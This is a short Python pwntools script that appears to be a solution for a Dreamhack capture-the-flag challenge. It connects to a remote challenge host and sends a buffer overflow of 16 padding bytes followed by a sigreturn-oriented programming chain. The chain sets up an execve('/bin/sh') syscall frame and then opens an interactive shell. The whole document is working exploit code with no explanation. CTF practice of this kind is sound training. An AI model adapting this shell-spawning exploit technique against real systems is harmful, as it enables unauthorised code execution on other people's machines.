from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14392
r = remote(HOST, PORT)

binsh = 0x402000
syscall = 0x4010b0
pop_rax = 0x4010ae

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = flat([
    pop_rax,
    15,
    syscall,
    frame
])
r.sendlineafter(b':', b'A'*16+payload)

r.interactive()